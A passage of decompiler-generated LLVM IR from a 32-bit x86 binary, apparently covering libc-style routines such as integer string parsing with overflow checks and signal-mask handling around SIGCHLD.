  %tmp = trunc i32 %arg4 to i8
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80545f7 = load i32, i32* @ebx, align 4
  store i32 %v0_80545f7, i32* %stack_var_-16, align 4
  %v0_80545fb = load i32, i32* bitcast (i32** @global_var_805722c.229 to i32*), align 4
  store i32 %v0_80545fb, i32* %edx.global-to-local, align 4
  %v4_8054601 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8054601, i32* %ebx.global-to-local, align 4
  %v2_805460e8 = load i8, i8* %arg1, align 1
  %v3_805460e9 = sext i8 %v2_805460e8 to i32
  store i32 %v3_805460e9, i32* %eax.global-to-local, align 4
  %v2_805461111 = mul nsw i32 %v3_805460e9, 2
  %v3_805461112 = add i32 %v2_805461111, %v0_80545fb
  %v4_805461113 = inttoptr i32 %v3_805461112 to i8*
  %v5_805461114 = load i8, i8* %v4_805461113, align 1
  %v6_805461115 = and i8 %v5_805461114, 32
  %v7_805461116 = icmp eq i8 %v6_805461115, 0
  %v1_805461517 = icmp eq i1 %v7_805461116, false
  br i1 %v1_805461517, label %dec_label_pc_805460d, label %dec_label_pc_8054617

dec_label_pc_805460d:                             ; preds = %dec_label_pc_80545f4, %dec_label_pc_805460d
  %v0_805460d = phi i32 [ %v1_805460d, %dec_label_pc_805460d ], [ %v4_8054601, %dec_label_pc_80545f4 ]
  %v1_805460d = add i32 %v0_805460d, 1
  store i32 %v1_805460d, i32* %ebx.global-to-local, align 4
  %v1_805460e = inttoptr i32 %v1_805460d to i8*
  %v2_805460e = load i8, i8* %v1_805460e, align 1
  %v3_805460e = sext i8 %v2_805460e to i32
  store i32 %v3_805460e, i32* %eax.global-to-local, align 4
  %v2_8054611 = mul nsw i32 %v3_805460e, 2
  %v3_8054611 = add i32 %v2_8054611, %v0_80545fb
  %v4_8054611 = inttoptr i32 %v3_8054611 to i8*
  %v5_8054611 = load i8, i8* %v4_8054611, align 1
  %v6_8054611 = and i8 %v5_8054611, 32
  %v7_8054611 = icmp eq i8 %v6_8054611, 0
  %v1_8054615 = icmp eq i1 %v7_8054611, false
  br i1 %v1_8054615, label %dec_label_pc_805460d, label %dec_label_pc_8054617

dec_label_pc_8054617:                             ; preds = %dec_label_pc_805460d, %dec_label_pc_80545f4
  %v0_805462c = phi i32 [ %v4_8054601, %dec_label_pc_80545f4 ], [ %v1_805460d, %dec_label_pc_805460d ]
  %v4_8054645 = phi i32 [ %v3_805460e9, %dec_label_pc_80545f4 ], [ %v3_805460e, %dec_label_pc_805460d ]
  %v9_8054617 = icmp eq i32 %v4_8054645, 43
  br i1 %v9_8054617, label %dec_label_pc_805462c, label %dec_label_pc_805461c

dec_label_pc_805461c:                             ; preds = %dec_label_pc_8054617
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_805461e = icmp eq i32 %v4_8054645, 45
  %v1_8054621 = icmp eq i1 %v9_805461e, false
  br i1 %v1_8054621, label %dec_label_pc_805462d, label %dec_label_pc_805462c

dec_label_pc_805462c:                             ; preds = %dec_label_pc_8054617, %dec_label_pc_805461c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_805461c ], [ 0, %dec_label_pc_8054617 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_805462c = add i32 %v0_805462c, 1
  store i32 %v1_805462c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805462d

dec_label_pc_805462d:                             ; preds = %dec_label_pc_805461c, %dec_label_pc_805462c
  %v0_805463f = phi i32 [ %v0_805462c, %dec_label_pc_805461c ], [ %v1_805462c, %dec_label_pc_805462c ]
  %v1_805462f = and i32 %arg3, -17
  %v2_805462f = icmp eq i32 %v1_805462f, 0
  %v1_8054635 = icmp eq i1 %v2_805462f, false
  br i1 %v1_8054635, label %dec_label_pc_805465b, label %dec_label_pc_8054637

dec_label_pc_8054637:                             ; preds = %dec_label_pc_805462d
  %v1_8054637 = add i32 %arg3, 10
  store i32 %v1_8054637, i32* %esi.global-to-local, align 4
  %v1_805463a = inttoptr i32 %v0_805463f to i8*
  %v2_805463a = load i8, i8* %v1_805463a, align 1
  %v8_805463a = icmp eq i8 %v2_805463a, 48
  %v1_805463d = icmp eq i1 %v8_805463a, false
  br i1 %v1_805463d, label %dec_label_pc_8054651, label %dec_label_pc_805463f

dec_label_pc_805463f:                             ; preds = %dec_label_pc_8054637
  %v1_805463f = add i32 %v0_805463f, 1
  store i32 %v1_805463f, i32* %ebx.global-to-local, align 4
  %v1_8054640 = add i32 %arg3, 8
  store i32 %v1_8054640, i32* %esi.global-to-local, align 4
  %v1_8054645 = inttoptr i32 %v1_805463f to i8*
  %v2_8054645 = load i8, i8* %v1_8054645, align 1
  %v3_8054645 = zext i8 %v2_8054645 to i32
  %v5_8054645 = and i32 %v4_8054645, -256
  %v6_8054645 = or i32 %v5_8054645, %v3_8054645
  %v1_8054647 = or i32 %v6_8054645, 32
  %v3_8054647 = trunc i32 %v1_8054647 to i8
  store i32 %v1_8054647, i32* %eax.global-to-local, align 4
  %v10_805464a = icmp eq i8 %v3_8054647, 120
  %v1_805464c = icmp eq i1 %v10_805464a, false
  br i1 %v1_805464c, label %dec_label_pc_8054651, label %dec_label_pc_805464e

dec_label_pc_805464e:                             ; preds = %dec_label_pc_805463f
  %v2_805464e = mul i32 %v1_8054640, 2
  store i32 %v2_805464e, i32* %esi.global-to-local, align 4
  %v1_8054650 = add i32 %v0_805463f, 2
  store i32 %v1_8054650, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054651

dec_label_pc_8054651:                             ; preds = %dec_label_pc_805463f, %dec_label_pc_8054637, %dec_label_pc_805464e
  %v0_805467a26 = phi i32 [ %v1_805463f, %dec_label_pc_805463f ], [ %v0_805463f, %dec_label_pc_8054637 ], [ %v1_8054650, %dec_label_pc_805464e ]
  %v0_80546d134 = phi i32 [ %v1_805463f, %dec_label_pc_805463f ], [ %v4_8054601, %dec_label_pc_8054637 ], [ %v1_805463f, %dec_label_pc_805464e ]
  %v0_8054651 = phi i32 [ %v1_8054640, %dec_label_pc_805463f ], [ %v1_8054637, %dec_label_pc_8054637 ], [ %v2_805464e, %dec_label_pc_805464e ]
  %v7_8054654 = icmp sgt i32 %v0_8054651, 16
  br i1 %v7_8054654, label %dec_label_pc_805465b.thread, label %dec_label_pc_805465b

dec_label_pc_805465b.thread:                      ; preds = %dec_label_pc_8054651
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054665

dec_label_pc_805465b:                             ; preds = %dec_label_pc_8054651, %dec_label_pc_805462d
  %v0_80546d135 = phi i32 [ %v0_80546d134, %dec_label_pc_8054651 ], [ %v4_8054601, %dec_label_pc_805462d ]
  %v0_805467a27 = phi i32 [ %v0_805467a26, %dec_label_pc_8054651 ], [ %v0_805463f, %dec_label_pc_805462d ]
  %v0_805466a = phi i32 [ %v0_8054651, %dec_label_pc_8054651 ], [ %arg3, %dec_label_pc_805462d ]
  %v1_805465b = add i32 %v0_805466a, -2
  store i32 %v1_805465b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8054663 = icmp ugt i32 %v1_805465b, 34
  br i1 %v6_8054663, label %dec_label_pc_80546c6, label %dec_label_pc_8054665

dec_label_pc_8054665:                             ; preds = %dec_label_pc_805465b.thread, %dec_label_pc_805465b
  %v0_805466a59 = phi i32 [ 16, %dec_label_pc_805465b.thread ], [ %v0_805466a, %dec_label_pc_805465b ]
  %v0_805467a2758 = phi i32 [ %v0_805467a26, %dec_label_pc_805465b.thread ], [ %v0_805467a27, %dec_label_pc_805465b ]
  %v0_80546d13557 = phi i32 [ %v0_80546d134, %dec_label_pc_805465b.thread ], [ %v0_80546d135, %dec_label_pc_805465b ]
  %div = udiv i32 -1, %v0_805466a59
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp52 = urem i32 -1, %v0_805466a59
  %v1_805466c = trunc i32 %tmp52 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_80546a6 = urem i32 %arg4, 256
  br label %dec_label_pc_805467a

dec_label_pc_8054678:                             ; preds = %dec_label_pc_80546bc, %dec_label_pc_80546a6
  %v4_805467a.pre = phi i32 [ %v1_8054690, %dec_label_pc_80546bc ], [ %v4_805467a.pre.pre, %dec_label_pc_80546a6 ]
  %v0_8054678 = phi i32 [ %v1_8054697, %dec_label_pc_80546bc ], [ %v0_8054678.pre, %dec_label_pc_80546a6 ]
  br label %dec_label_pc_805467a

dec_label_pc_805467a:                             ; preds = %dec_label_pc_8054665, %dec_label_pc_8054678
  %v0_80546d133 = phi i32 [ %v0_80546d13557, %dec_label_pc_8054665 ], [ %v0_8054678, %dec_label_pc_8054678 ]
  %v0_8054697 = phi i32 [ %v0_805467a2758, %dec_label_pc_8054665 ], [ %v0_8054678, %dec_label_pc_8054678 ]
  %v4_805467a = phi i32 [ %div, %dec_label_pc_8054665 ], [ %v4_805467a.pre, %dec_label_pc_8054678 ]
  %v1_805467a = inttoptr i32 %v0_8054697 to i8*
  %v2_805467a = load i8, i8* %v1_805467a, align 1
  %v3_805467a = zext i8 %v2_805467a to i32
  %v5_805467a = and i32 %v4_805467a, -256
  %v6_805467a = or i32 %v3_805467a, %v5_805467a
  store i32 %v6_805467a, i32* %eax.global-to-local, align 4
  %v1_805467c = add i32 %v6_805467a, -48
  %v1_805467f = trunc i32 %v1_805467c to i8
  %tmp60 = icmp ult i8 %v1_805467f, 10
  br i1 %tmp60, label %dec_label_pc_8054690, label %dec_label_pc_8054684

dec_label_pc_8054684:                             ; preds = %dec_label_pc_805467a
  %v1_8054684 = or i32 %v6_805467a, 32
  %v3_8054684 = trunc i32 %v1_8054684 to i8
  store i32 %v1_8054684, i32* %eax.global-to-local, align 4
  %v1_8054687 = and i32 %v1_805467c, -256
  %v2_8054687 = or i32 %v1_8054687, 40
  %tmp61 = icmp ult i8 %v3_8054684, 97
  br i1 %tmp61, label %dec_label_pc_8054690, label %dec_label_pc_805468d

dec_label_pc_805468d:                             ; preds = %dec_label_pc_8054684
  %v1_805468d = add i32 %v1_8054684, -87
  br label %dec_label_pc_8054690

dec_label_pc_8054690:                             ; preds = %dec_label_pc_8054684, %dec_label_pc_805467a, %dec_label_pc_805468d
  %v0_80546bf = phi i32 [ %v2_8054687, %dec_label_pc_8054684 ], [ %v1_805467c, %dec_label_pc_805467a ], [ %v1_805468d, %dec_label_pc_805468d ]
  %v1_8054690 = urem i32 %v0_80546bf, 256
  store i32 %v1_8054690, i32* %eax.global-to-local, align 4
  %v1_8054693 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054693 = sub i32 %v1_8054690, %v1_8054693
  %v10_8054693 = and i32 %v2_8054693, %v1_8054693
  %v11_8054693 = icmp slt i32 %v10_8054693, 0
  %v13_8054693 = icmp slt i32 %v2_8054693, 0
  %v2_8054695 = icmp eq i1 %v13_8054693, %v11_8054693
  br i1 %v2_8054695, label %dec_label_pc_80546c6, label %dec_label_pc_8054697

dec_label_pc_8054697:                             ; preds = %dec_label_pc_8054690
  %v1_8054697 = add i32 %v0_8054697, 1
  store i32 %v1_8054697, i32* %ebx.global-to-local, align 4
  %v0_8054698 = load i32, i32* %edx.global-to-local, align 4
  %tmp62 = icmp ugt i32 %v0_8054698, %div
  br i1 %tmp62, label %dec_label_pc_80546a6, label %dec_label_pc_805469e

dec_label_pc_805469e:                             ; preds = %dec_label_pc_8054697
  %v15_8054698 = icmp eq i32 %v0_8054698, %div
  %v1_805469e = icmp eq i1 %v15_8054698, false
  br i1 %v1_805469e, label %dec_label_pc_80546bc, label %dec_label_pc_80546a0

dec_label_pc_80546a0:                             ; preds = %dec_label_pc_805469e
  %v1_80546a0 = trunc i32 %v0_80546bf to i8
  %tmp63 = icmp ugt i8 %v1_80546a0, %v1_805466c
  br i1 %tmp63, label %dec_label_pc_80546a6, label %dec_label_pc_80546bc

dec_label_pc_80546a6:                             ; preds = %dec_label_pc_80546a0, %dec_label_pc_8054697
  store i32 %v4_80546a6, i32* %eax.global-to-local, align 4
  %v0_80546aa = load i32, i32* %ebp.global-to-local, align 4
  %v2_80546aa = and i32 %v0_80546aa, %v4_80546a6
  store i32 %v2_80546aa, i32* %ebp.global-to-local, align 4
  %v1_80546ac = call i32 @function_80530f9(i32 %div)
  store i32 %v1_80546ac, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_80546b4 = inttoptr i32 %v1_80546ac to i32*
  store i32 34, i32* %v1_80546b4, align 4
  %v0_8054678.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_805467a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054678

dec_label_pc_80546bc:                             ; preds = %dec_label_pc_80546a0, %dec_label_pc_805469e
  %v4_80546bc = mul i32 %v0_8054698, %v1_8054693
  store i32 %v1_8054690, i32* %eax.global-to-local, align 4
  %v2_80546c2 = add i32 %v4_80546bc, %v1_8054690
  store i32 %v2_80546c2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054678

dec_label_pc_80546c6:                             ; preds = %dec_label_pc_8054690, %dec_label_pc_805465b
  %v0_80546d1 = phi i32 [ %v0_80546d135, %dec_label_pc_805465b ], [ %v0_80546d133, %dec_label_pc_8054690 ]
  %stack_var_-24.0 = phi i32 [ %tmp42, %dec_label_pc_805465b ], [ %div, %dec_label_pc_8054690 ]
  %v4_80546c6 = icmp eq i32 %arg2, 0
  br i1 %v4_80546c6, label %dec_label_pc_80546d3, label %dec_label_pc_80546cd

dec_label_pc_80546cd:                             ; preds = %dec_label_pc_80546c6
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80546d1 = inttoptr i32 %arg2 to i32*
  store i32 %v0_80546d1, i32* %v2_80546d1, align 4
  br label %dec_label_pc_80546d3

dec_label_pc_80546d3:                             ; preds = %dec_label_pc_80546c6, %dec_label_pc_80546cd
  %v0_80546d3 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_80546d3, i32* %eax.global-to-local, align 4
  %v1_80546d5 = trunc i32 %v0_80546d3 to i8
  %v6_80546d5 = icmp eq i8 %v1_80546d5, 0
  %v2_80546d7 = zext i1 %v6_80546d5 to i32
  %v1_80546d94 = or i32 %v2_80546d7, -2147483648
  store i32 %v1_80546d94, i32* %ebx.global-to-local, align 4
  %v5_80546df = icmp eq i8 %tmp, 0
  br i1 %v5_80546df, label %dec_label_pc_80546f7, label %dec_label_pc_80546e6

dec_label_pc_80546e6:                             ; preds = %dec_label_pc_80546d3
  %v0_80546e6 = load i32, i32* %edx.global-to-local, align 4
  %tmp64 = icmp ugt i32 %v0_80546e6, %v1_80546d94
  br i1 %tmp64, label %dec_label_pc_80546ea, label %dec_label_pc_80546f7

dec_label_pc_80546ea:                             ; preds = %dec_label_pc_80546e6
  %v1_80546ea = call i32 @function_80530f9(i32 %stack_var_-24.0)
  store i32 %v1_80546ea, i32* %eax.global-to-local, align 4
  %v0_80546ef = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80546ef, i32* %edx.global-to-local, align 4
  %v1_80546f1 = inttoptr i32 %v1_80546ea to i32*
  store i32 34, i32* %v1_80546f1, align 4
  %v0_80546f7.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80546f7

dec_label_pc_80546f7:                             ; preds = %dec_label_pc_80546e6, %dec_label_pc_80546d3, %dec_label_pc_80546ea
  %v0_80546f7 = phi i32 [ %v0_80546d3, %dec_label_pc_80546e6 ], [ %v0_80546d3, %dec_label_pc_80546d3 ], [ %v0_80546f7.pre, %dec_label_pc_80546ea ]
  store i32 %v0_80546f7, i32* %eax.global-to-local, align 4
  %v3_80546f9 = trunc i32 %v0_80546f7 to i8
  %v4_80546f9 = icmp eq i8 %v3_80546f9, 0
  %v0_8054702.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_80546f9, label %dec_label_pc_80546ff, label %dec_label_pc_80546fd

dec_label_pc_80546fd:                             ; preds = %dec_label_pc_80546f7
  %v1_80546fd = sub i32 0, %v0_8054702.pre
  store i32 %v1_80546fd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80546ff

dec_label_pc_80546ff:                             ; preds = %dec_label_pc_80546f7, %dec_label_pc_80546fd
  %v0_8054702 = phi i32 [ %v1_80546fd, %dec_label_pc_80546fd ], [ %v0_8054702.pre, %dec_label_pc_80546f7 ]
  store i32 %v0_8054702, i32* %eax.global-to-local, align 4
  %v2_8054704 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8054704, i32* @ebx, align 4
  ret i32 %v0_8054702

; uselistorder directives
  uselistorder i32 %v0_8054702, { 1, 0 }
  uselistorder i32 %v0_80546f7, { 1, 0 }
  uselistorder i32 %v0_8054698, { 0, 2, 1 }
  uselistorder i32 %v1_8054697, { 1, 0 }
  uselistorder i32 %v2_8054693, { 1, 0 }
  uselistorder i32 %v1_8054690, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_80546bf, { 1, 0 }
  uselistorder i32 %v0_8054678, { 1, 0 }
  uselistorder i32 %v4_80546a6, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_805466a59, { 1, 0 }
  uselistorder i32 %v0_80546d135, { 1, 0 }
  uselistorder i32 %v2_805464e, { 1, 0 }
  uselistorder i32 %v1_8054647, { 1, 0 }
  uselistorder i32 %v1_8054640, { 1, 0, 2 }
  uselistorder i32 %v0_805463f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8054645, { 2, 0, 1 }
  uselistorder i32 %v1_805460d, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8054601, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 17, 15, 16, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 6, 5, 4, 7, 12, 9, 10, 13, 11, 8 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80546ff, { 1, 0 }
  uselistorder label %dec_label_pc_80546f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80546d3, { 1, 0 }
  uselistorder label %dec_label_pc_8054690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805467a, { 1, 0 }
  uselistorder label %dec_label_pc_8054665, { 1, 0 }
  uselistorder label %dec_label_pc_8054651, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805462d, { 1, 0 }
  uselistorder label %dec_label_pc_805462c, { 1, 0 }
  uselistorder label %dec_label_pc_805460d, { 1, 0 }
}

define i32 @function_8054709(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054709:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805471c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805471c, i32* @ebx, align 4
  %v2_8054721 = call i32 @function_8054a80(i32 %v2_805471c, i32 134564477)
  %v1_805472d = call i32 @function_8054a7d(i32 ptrtoint (i32* @global_var_8057210.230 to i32))
  %v0_8054732 = load i32, i32* @global_var_80572f8.231, align 8
  store i32 %v0_8054732, i32* @eax, align 4
  %v1_805473a = icmp eq i32 %v0_8054732, 0
  br i1 %v1_805473a, label %dec_label_pc_8054747, label %dec_label_pc_805473e

dec_label_pc_805473e:                             ; preds = %dec_label_pc_8054709
  %v0_8054741 = load i32, i32* @esi, align 4
  %v1_8054742 = call i32 @unknown_0(i32 %v0_8054741)
  store i32 %v1_8054742, i32* @eax, align 4
  br label %dec_label_pc_8054747

dec_label_pc_8054747:                             ; preds = %dec_label_pc_8054709, %dec_label_pc_805473e
  %v2_805474c = call i32 @function_8054a80(i32 %v2_805471c, i32 1)
  %v0_8054751 = call i32 @function_8054a3e()
  %v0_805476a = load i32, i32* @esi, align 4
  %v1_805476b = call i32 @function_8054e20(i32 %v0_805476a)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8054e20, { 1, 0 }
  uselistorder i32 (i32)* @function_8054a7d, { 6, 5, 4, 3, 2, 10, 0, 1, 9, 8, 7 }
  uselistorder i32 (i32, i32)* @function_8054a80, { 7, 6, 5, 4, 13, 12, 3, 0, 2, 1, 11, 10, 9, 8 }
  uselistorder label %dec_label_pc_8054747, { 1, 0 }
}

define i32 @function_8054770(i32 %arg1) local_unnamed_addr {
dec_label_pc_8054770:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8054770 = load i32, i32* @ebp, align 4
  %v0_8054771 = load i32, i32* @edi, align 4
  %v0_8054772 = load i32, i32* @esi, align 4
  %v0_8054773 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8054786 = icmp eq i32 %arg1, 0
  %v1_8054788 = icmp eq i1 %v1_8054786, false
  br i1 %v1_8054788, label %dec_label_pc_805478f.lr.ph, label %dec_label_pc_80548e7

dec_label_pc_805478f.lr.ph:                       ; preds = %dec_label_pc_8054770
  %v15_8054774 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805478f56 = add i32 %v15_8054774, 416
  %v5_805478f57 = inttoptr i32 %v4_805478f56 to i32*
  store i32 0, i32* %v5_805478f57, align 4
  %v0_805479a58 = load i32, i32* %eax.global-to-local, align 4
  %v1_805479a59 = add i32 %v0_805479a58, -1
  %v9_805479a60 = icmp slt i32 %v1_805479a59, 0
  store i32 %v1_805479a59, i32* %eax.global-to-local, align 4
  %v1_805479b61 = icmp eq i1 %v9_805479a60, false
  br i1 %v1_805479b61, label %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge, label %dec_label_pc_805479d

dec_label_pc_805478f.dec_label_pc_805478f_crit_edge: ; preds = %dec_label_pc_805478f.lr.ph, %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge
  %v1_805479a62 = phi i32 [ %v1_805479a, %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge ], [ %v1_805479a59, %dec_label_pc_805478f.lr.ph ]
  %v0_805478f.pre = load i32, i32* @esp, align 4
  %v2_805478f = mul i32 %v1_805479a62, 4
  %v3_805478f = add i32 %v0_805478f.pre, 292
  %v4_805478f = add i32 %v3_805478f, %v2_805478f
  %v5_805478f = inttoptr i32 %v4_805478f to i32*
  store i32 0, i32* %v5_805478f, align 4
  %v0_805479a = load i32, i32* %eax.global-to-local, align 4
  %v1_805479a = add i32 %v0_805479a, -1
  %v9_805479a = icmp slt i32 %v1_805479a, 0
  store i32 %v1_805479a, i32* %eax.global-to-local, align 4
  %v1_805479b = icmp eq i1 %v9_805479a, false
  br i1 %v1_805479b, label %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge, label %dec_label_pc_805479d

dec_label_pc_805479d:                             ; preds = %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge, %dec_label_pc_805478f.lr.ph
  %v1_805479a.lcssa = phi i32 [ %v1_805479a59, %dec_label_pc_805478f.lr.ph ], [ %v1_805479a, %dec_label_pc_805478f.dec_label_pc_805478f_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_80547b3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80547b3, i32* @ebx, align 4
  store i32 %v2_80547b3, i32* %stack_var_-460, align 4
  %v4_80547bb = call i32 @function_805350e(i32 %v2_80547b3, i32 17, i32 %v1_805479a.lcssa, i32 %v1_805479a.lcssa)
  store i32 %v4_80547bb, i32* %eax.global-to-local, align 4
  %v2_80547c3 = icmp slt i32 %v4_80547bb, 0
  br i1 %v2_80547c3, label %dec_label_pc_80548eb, label %dec_label_pc_80547cb

dec_label_pc_80547cb:                             ; preds = %dec_label_pc_805479d
  %v2_80547cc = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80547cc, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80547d7 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80547d7 = call i32 @function_8052e2d(i32 0, %_TYPEDEF_sigset_t* %v3_80547d7, i32 %v2_80547cc)
  store i32 %v4_80547d7, i32* %eax.global-to-local, align 4
  %v1_80547df = icmp eq i32 %v4_80547d7, 0
  %v1_80547e1 = icmp eq i1 %v1_80547df, false
  br i1 %v1_80547e1, label %dec_label_pc_80548eb, label %dec_label_pc_80547e7

dec_label_pc_80547e7:                             ; preds = %dec_label_pc_80547cb
  store i32 %v2_80547cc, i32* %stack_var_-460, align 4
  %v4_80547ec = call i32 @function_80534ea(i32 %v2_80547cc, i32 17, i32 %v4_80547d7, i32 %v4_80547d7)
  store i32 %v4_80547ec, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80547f9 = icmp eq i32 %v4_80547ec, 0
  br i1 %v1_80547f9, label %dec_label_pc_8054802.lr.ph, label %dec_label_pc_80548b5

dec_label_pc_8054802.lr.ph:                       ; preds = %dec_label_pc_80547e7
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_805478f57, align 4
  %v0_805480d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_805480d51 = add i32 %v0_805480d50, -1
  %v9_805480d52 = icmp slt i32 %v1_805480d51, 0
  store i32 %v1_805480d51, i32* %edx.global-to-local, align 4
  %v1_805480e53 = icmp eq i1 %v9_805480d52, false
  br i1 %v1_805480e53, label %dec_label_pc_8054802.dec_label_pc_8054802_crit_edge, label %dec_label_pc_8054810

dec_label_pc_8054802.dec_label_pc_8054802_crit_edge: ; preds = %dec_label_pc_8054802.lr.ph, %dec_label_pc_8054802.dec_label_pc_8054802_crit_edge
  %v1_805480d54 = phi i32 [ %v1_805480d, %dec_label_pc_8054802.dec_label_pc_8054802_crit_edge ], [ %v1_805480d51, %dec_label_pc_8054802.lr.ph ]
  %v0_8054802.pre = load i32, i32* @esp, align 4
  %v2_8054802 = mul i32 %v1_805480d54, 4
  %v3_8054802 = add i32 %v0_8054802.pre, 292
  %v4_8054802 = add i32 %v3_8054802, %v2_8054802
  %v5_8054802 = inttoptr i32 %v4_8054802 to i32*
  store i32 0, i32* %v5_8054802, align 4
  %v0_805480d = load i32, i32* %edx.global-to-local, align 4
  %v1_805480d = add i32 %v0_805480d, -1
  %v9_805480d = icmp slt i32 %v1_805480d, 0
  store i32 %v1_805480d, i32* %edx.global-to-local, align 4
  %v1_805480e = icmp eq i1 %v9_805480d, false
  br i1 %v1_805480e, label %dec_label_pc_8054802.dec_label_pc_8054802_crit_edge, label %dec_label_pc_8054810

dec_label_pc_8054810:                             ; preds = %dec_label_pc_8054802.dec_label_pc_8054802_crit_edge, %dec_label_pc_8054802.lr.ph
  store i32 %v2_80547b3, i32* %eax.global-to-local, align 4
  store i32 %v2_80547b3, i32* %stack_var_-460, align 4
  %v4_805481c = call i32 @function_805350e(i32 %v2_80547b3, i32 17, i32 0, i32 0)
  store i32 %v4_805481c, i32* %eax.global-to-local, align 4
  %v2_8054824 = icmp slt i32 %v4_805481c, 0
  br i1 %v2_8054824, label %dec_label_pc_80548eb, label %dec_label_pc_805482c

dec_label_pc_805482c:                             ; preds = %dec_label_pc_8054810
  %v2_805482d = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_805482d, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8054836 = call i32 @function_8054cbf(i32 17, i32* null, i32 %v2_805482d)
  store i32 %v4_8054836, i32* %eax.global-to-local, align 4
  %v2_805483e = icmp slt i32 %v4_8054836, 0
  %v1_8054840 = icmp eq i1 %v2_805483e, false
  br i1 %v1_8054840, label %dec_label_pc_805486a, label %dec_label_pc_8054842

dec_label_pc_8054842:                             ; preds = %dec_label_pc_805482c
  %v0_8054842 = load i32, i32* %stack_var_-460, align 4
  %v1_8054842 = call i32 @function_80530f9(i32 %v0_8054842)
  store i32 %v1_8054842, i32* %eax.global-to-local, align 4
  store i32 %v1_8054842, i32* @ebx, align 4
  %v1_8054849 = inttoptr i32 %v1_8054842 to i32*
  %v2_8054849 = load i32, i32* %v1_8054849, align 4
  store i32 %v2_8054849, i32* @esi, align 4
  store i32 %v2_80547cc, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054858 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054858 = call i32 @function_8052e2d(i32 2, %_TYPEDEF_sigset_t* %v3_8054858, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8054863 = load i32, i32* @esi, align 4
  %v1_8054863 = load i32, i32* @ebx, align 4
